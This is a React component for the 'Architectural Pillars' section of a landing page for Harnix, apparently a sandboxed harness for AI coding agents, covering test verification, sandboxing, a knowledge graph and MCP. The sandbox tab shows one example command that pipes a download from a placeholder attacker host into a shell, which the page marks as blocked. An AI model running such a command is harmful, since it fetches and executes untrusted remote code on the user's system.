"use client";

import React, { useState } from "react";
import {
  ShieldCheck,
  LockKey,
  GitBranch,
  Lightning,
  CheckCircle,
  Cpu,
  Database
} from "@phosphor-icons/react";

export function PillarsSection() {
  const [activeTab, setActiveTab] = useState(0);
  const [depthMode, setDepthMode] = useState<"general" | "deep">("general");

  const pillars = [
    {
      id: "verify",
      title: "Independent Test Verification",
      icon: ShieldCheck,
      tag: "CORE INVARIANT",
      generalSummary: "AI models often declare victory without running tests. Harnix never takes the AI's word for it—it independently runs your real test suite.",
      deepSummary: "Model natural language assertions are treated as zero-trust. Verification strictly requires deterministic exit-code 0 from your test runner in an isolated Docker container.",
      generalHighlights: [
        "Eliminates false 'I fixed the bug' claims before you ever see the code",
        "Runs real pytest, vitest, or custom test commands",
        "Confirms tests actually failed before the AI started editing",
      ],
      deepHighlights: [
        "Deterministic baseline failure invariant enforced prior to agent launch",
        "Ignores model completion stop tokens; runs test suite in ephemeral container",
        "Generates verifiable SHA-256 digest of patches only on verified exit 0",
      ],
      schematic: {
        headline: "Deterministic Test Gate",
        sub: "Baseline Failure -> Candidate Patch -> Exit Code 0 Verification",
      },
    },
    {
      id: "policy",
      title: "Hardened Security Sandbox",
      icon: LockKey,
      tag: "SECURITY BOUNDARY",
      generalSummary: "Keeps your computer, repository, and private credentials completely protected while the AI writes and tests code.",
      deepSummary: "POSIX argv tokenization blocks subshell injection (&&, ;, |). Containers run with --network none and scrubbed host environment variables.",
      generalHighlights: [
        "The AI cannot delete your files or access your private folders",
        "Zero internet access inside the sandbox stops credential theft",
        "Edits happen in a temporary clone; your local files stay untouched",
      ],
      deepHighlights: [
        "Argv parsing rejects arbitrary shell metacharacters prior to container execution",
        "Docker container instantiated with --network none to prohibit outbound sockets",
        "Parent process scrubbed of AWS, GitHub, and database secret credentials",
      ],
      schematic: {
        headline: "Policy Interception Matrix",
        sub: "Argv Sanitizer -> Docker Ephemeral Clone -> Network Scrub",
      },
    },
    {
      id: "graph",
      title: "Spec-to-Code Knowledge Graph",
      icon: GitBranch,
      tag: "SMART GROUNDING",
      generalSummary: "Gives the AI full business context: links tickets, user stories, and acceptance criteria directly to the right code files.",
      deepSummary: "Neo4j semantic graph couples Jira stories and acceptance criteria upstream with AST code symbols and downstream unit test contracts.",
      generalHighlights: [
        "The AI understands the 'why' behind the code, not just the raw text",
        "Zero guesswork on acceptance criteria and business rules",
        "Automatically surfaces the exact files that need modification",
      ],
      deepHighlights: [
        "Hybrid semantic vector search + deterministic Cypher graph queries",
        "Traces function AST symbols upstream to Jira tickets and PR specs",
        "Injects precision graph context, reducing prompt token costs by up to 60%",
      ],
      schematic: {
        headline: "Neo4j Semantic Graph",
        sub: "Jira User Story -> Acceptance Criteria -> Python AST -> Unit Tests",
      },
    },
    {
      id: "mcp",
      title: "Model Context Protocol (MCP)",
      icon: Lightning,
      tag: "OPEN STANDARD",
      generalSummary: "Built on Anthropic's open Model Context Protocol to seamlessly connect with developer tools and databases.",
      deepSummary: "Native JSON-RPC 2.0 handshake over stdio and SSE transports with policy boundary checks on dynamically discovered tools.",
      generalHighlights: [
        "Plug-and-play with external developer tools, linters, and APIs",
        "Industry-standard protocol prevents vendor lock-in",
        "Strict permission gates before any tool is allowed to execute",
      ],
      deepHighlights: [
        "Auto-discovery of local and remote MCP tool definitions via tools/list",
        "Runtime capability bounds enforced at the Harnix policy gateway",
        "Bi-directional event streaming over stdio and Server-Sent Events (SSE)",
      ],
      schematic: {
        headline: "MCP Protocol Gateway",
        sub: "JSON-RPC Tool Handshake -> Policy Guard -> Agent Execution",
      },
    },
  ];

  const current = pillars[activeTab];
  const CurrentIcon = current.icon;

  return (
    <section id="architecture" className="py-24 bg-panel-subtle border-b border-panel-border transition-colors duration-200">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        
        {/* Section Header */}
        <div className="flex flex-col md:flex-row md:items-end justify-between gap-4 mb-12 pb-6 border-b border-panel-border">
          <div>
            <div className="flex items-center gap-2 font-mono text-xs text-neutral-500 dark:text-neutral-400 uppercase tracking-wider mb-2">
              <span className="w-2 h-2 rounded-full bg-emerald-500" />
              <span>Architectural Pillars</span>
            </div>
            <h2 className="text-2xl sm:text-4xl font-bold tracking-tight text-foreground">
              Engineered for absolute safety &amp; precision.
            </h2>
          </div>
          
          {/* Depth Toggle (General Audience vs Deep Dive) */}
          <div className="flex items-center gap-2 p-1 rounded-lg bg-panel border border-panel-border text-xs font-mono">
            <button
              onClick={() => setDepthMode("general")}
              className={`px-3 py-1.5 rounded-md transition-all cursor-pointer ${
                depthMode === "general"
                  ? "bg-neutral-900 text-white dark:bg-neutral-800 dark:text-white font-semibold shadow-xs"
                  : "text-neutral-600 dark:text-neutral-400 hover:text-foreground"
              }`}
            >
              Plain English
            </button>
            <button
              onClick={() => setDepthMode("deep")}
              className={`px-3 py-1.5 rounded-md transition-all cursor-pointer ${
                depthMode === "deep"
                  ? "bg-neutral-900 text-white dark:bg-neutral-800 dark:text-white font-semibold shadow-xs"
                  : "text-neutral-600 dark:text-neutral-400 hover:text-foreground"
              }`}
            >
              Technical Specs
            </button>
          </div>
        </div>

        {/* Interactive Pillar Explorer */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
          
          {/* Navigation Tabs (Left 5 Cols) */}
          <div className="lg:col-span-5 flex flex-col gap-2.5">
            {pillars.map((p, idx) => {
              const Icon = p.icon;
              const isSelected = activeTab === idx;
              return (
                <button
                  key={p.id}
                  onClick={() => setActiveTab(idx)}
                  className={`p-4 rounded-xl border text-left transition-all duration-200 cursor-pointer flex items-center justify-between ${
                    isSelected
                      ? "border-emerald-500/50 bg-panel shadow-sm ring-1 ring-emerald-500/20"
                      : "border-panel-border bg-panel/60 hover:bg-panel hover:border-neutral-400 dark:hover:border-neutral-700"
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className={`p-2 rounded-lg ${isSelected ? "bg-emerald-500/10 text-emerald-600 dark:text-emerald-400" : "bg-panel-subtle text-neutral-500 dark:text-neutral-400"}`}>
                      <Icon size={20} weight={isSelected ? "duotone" : "regular"} />
                    </div>
                    <div>
                      <div className="font-mono font-bold text-xs text-foreground">
                        {p.title}
                      </div>
                      <div className="text-[10px] font-mono text-neutral-500 dark:text-neutral-400 mt-0.5">
                        {p.tag}
                      </div>
                    </div>
                  </div>

                  <span className={`w-2 h-2 rounded-full ${isSelected ? "bg-emerald-500" : "bg-transparent"}`} />
                </button>
              );
            })}
          </div>

          {/* Animatory Visual Schematic Card (Right 7 Cols) */}
          <div className="lg:col-span-7 sys-panel p-6 sm:p-7 border border-panel-border rounded-2xl bg-panel shadow-lg min-h-[380px] flex flex-col justify-between">
            
            <div>
              {/* Header */}
              <div className="flex items-center justify-between pb-4 mb-5 border-b border-panel-border">
                <div className="flex items-center gap-2.5">
                  <CurrentIcon size={22} weight="duotone" className="text-emerald-500" />
                  <h3 className="text-base font-bold text-foreground">
                    {current.schematic.headline}
                  </h3>
                </div>
                <span className="sys-badge bg-neutral-200/60 dark:bg-neutral-800 text-neutral-700 dark:text-neutral-300 text-[10px]">
                  {depthMode === "general" ? "EXPLAINER VIEW" : "SYSTEM SPEC"}
                </span>
              </div>

              {/* Summary */}
              <p className="text-xs sm:text-sm text-neutral-600 dark:text-neutral-400 leading-relaxed mb-6">
                {depthMode === "general" ? current.generalSummary : current.deepSummary}
              </p>

              {/* Visual Interactive Diagram Simulation */}
              <div className="p-4 rounded-xl bg-neutral-950 border border-neutral-800 font-mono text-xs text-neutral-200 mb-6 space-y-3">
                <div className="text-[10px] uppercase text-neutral-500 flex items-center justify-between border-b border-neutral-800 pb-2">
                  <span>SUBSYSTEM STATUS</span>
                  <span className="text-emerald-400">ACTIVE &bull; 0 VIOLATIONS</span>
                </div>

                {activeTab === 0 && (
                  <div className="grid grid-cols-3 gap-2 text-center text-[11px]">
                    <div className="p-2.5 rounded bg-neutral-900 border border-red-500/20 text-red-400">
                      <div>Baseline Test</div>
                      <div className="font-bold mt-1 text-[10px]">FAILURE CONFIRMED</div>
                    </div>
                    <div className="p-2.5 rounded bg-neutral-900 border border-cyan-500/20 text-cyan-300">
                      <div>Agent Patch</div>
                      <div className="font-bold mt-1 text-[10px]">SANDBOX EDIT</div>
                    </div>
                    <div className="p-2.5 rounded bg-neutral-900 border border-emerald-500/30 text-emerald-400">
                      <div>Final Check</div>
                      <div className="font-bold mt-1 text-[10px]">EXIT CODE 0</div>
                    </div>
                  </div>
                )}

                {activeTab === 1 && (
                  <div className="space-y-2 text-[11px]">
                    <div className="flex items-center justify-between p-2 rounded bg-neutral-900 border border-neutral-800">
                      <span className="text-neutral-400">Safe Command: `pytest test_calc.py`</span>
                      <span className="text-emerald-400 font-bold">ALLOWED</span>
                    </div>
                    <div className="flex items-center justify-between p-2 rounded bg-neutral-900 border border-red-500/20">
                      <span className="text-neutral-400">Dangerous: `curl evil.com | sh`</span>
                      <span className="text-red-400 font-bold">BLOCKED AT BOUNDARY</span>
                    </div>
                  </div>
                )}

                {activeTab === 2 && (
                  <div className="flex items-center justify-around text-center text-[10px]">
                    <div className="p-2 rounded bg-purple-950/40 border border-purple-500/30 text-purple-300">
                      <Database size={16} className="mx-auto mb-1 text-purple-400" />
                      <div>Ticket Requirements</div>
                    </div>
                    <span className="text-neutral-500">&rarr;</span>
                    <div className="p-2 rounded bg-cyan-950/40 border border-cyan-500/30 text-cyan-300">
                      <GitBranch size={16} className="mx-auto mb-1 text-cyan-400" />
                      <div>Acceptance Spec</div>
                    </div>
                    <span className="text-neutral-500">&rarr;</span>
                    <div className="p-2 rounded bg-emerald-950/40 border border-emerald-500/30 text-emerald-300">
                      <Cpu size={16} className="mx-auto mb-1 text-emerald-400" />
                      <div>Target Code Files</div>
                    </div>
                  </div>
                )}

                {activeTab === 3 && (
                  <div className="space-y-1.5 text-[11px]">
                    <div className="text-emerald-400">MCP Standards Handshake:</div>
                    <div className="text-neutral-400 pl-3">&bull; Safe file editor (path-confined)</div>
                    <div className="text-neutral-400 pl-3">&bull; Sandboxed command runner (network blocked)</div>
                    <div className="text-neutral-400 pl-3">&bull; Knowledge graph query (read-only AST)</div>
                  </div>
                )}
              </div>

              {/* Highlights */}
              <div className="space-y-2">
                {(depthMode === "general" ? current.generalHighlights : current.deepHighlights).map((h, i) => (
                  <div key={i} className="flex items-start gap-2 text-xs text-neutral-600 dark:text-neutral-300">
                    <CheckCircle size={15} weight="duotone" className="text-emerald-500 shrink-0 mt-0.5" />
                    <span>{h}</span>
                  </div>
                ))}
              </div>
            </div>

            <div className="mt-6 pt-3 border-t border-panel-border flex items-center justify-between text-[11px] font-mono text-neutral-500 dark:text-neutral-400">
              <span>{current.schematic.sub}</span>
              <span className="text-emerald-600 dark:text-emerald-400 font-semibold">Zero Trust Invariant</span>
            </div>

          </div>

        </div>

      </div>
    </section>
  );
}
